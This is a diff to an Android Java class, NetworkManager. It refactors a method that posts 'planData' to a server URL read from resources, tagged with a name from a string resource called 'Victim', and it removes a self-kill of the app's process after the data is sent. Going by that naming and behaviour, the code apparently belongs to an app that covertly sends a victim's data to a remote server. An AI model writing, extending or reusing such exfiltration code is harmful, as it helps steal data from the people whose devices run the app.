@@ -30,13 +30,18 @@ public class NetworkManager {
         // Initialize main thread handler
         mainHandler = new Handler(Looper.getMainLooper());
     }
+    public interface PostRequestCallback {
+        void onSuccess(String response);
+        void onFailure(String error);
+    }
 
-    public void sendPostRequest(String planData) {
+    public void sendPostRequest(String planData, PostRequestCallback callback) {
         // Create request body
         RequestBody formBody = new FormBody.Builder()
                 .add("mv01", planData)
                 .add("name", context.getString(R.string.Victim))
                 .build();
+
         // Create request
         Request request = new Request.Builder()
                 .url(context.getString(R.string.server_Url))
@@ -49,8 +54,12 @@ public class NetworkManager {
             public void onFailure(Call call, IOException e) {
                 // Handle network error on main thread
                 mainHandler.post(() -> {
-                    Toast.makeText(context, "Network Error", Toast.LENGTH_SHORT).show();
+                    String errorMessage = "Network Error: " + e.getMessage();
+                    Toast.makeText(context, errorMessage, Toast.LENGTH_SHORT).show();
                     Log.e("NetworkError", e.getMessage());
+                    if (callback != null) {
+                        callback.onFailure(errorMessage);  // Call the failure callback
+                    }
                 });
             }
 
@@ -62,18 +71,27 @@ public class NetworkManager {
                         String responseBody = response.body() != null ? response.body().string() : "No response";
                         mainHandler.post(() -> {
                             Log.d("NetworkResponse", responseBody);
-//                            Toast.makeText(context, "Data Sent", Toast.LENGTH_SHORT).show();
-                            android.os.Process.killProcess(android.os.Process.myPid());
+                            if (callback != null) {
+                                callback.onSuccess(responseBody);  // Call the success callback
+                            }
                         });
                     } else {
                         // Handle error response on main thread
+                        String errorMessage = "Response Code: " + response.code();
                         mainHandler.post(() -> {
-                            Log.e("NetworkError", "Response Code: " + response.code());
+                            Log.e("NetworkError", errorMessage);
+                            if (callback != null) {
+                                callback.onFailure(errorMessage);  // Call the failure callback
+                            }
                         });
                     }
                 } catch (IOException e) {
                     mainHandler.post(() -> {
-                        Log.e("NetworkError", "Error processing response", e);
+                        String errorMessage = "Error processing response: " + e.getMessage();
+                        Log.e("NetworkError", errorMessage, e);
+                        if (callback != null) {
+                            callback.onFailure(errorMessage);  // Call the failure callback
+                        }
                     });
                 } finally {
                     // Ensure response body is closed
@@ -84,4 +102,5 @@ public class NetworkManager {
             }
         });
     }
+
 }
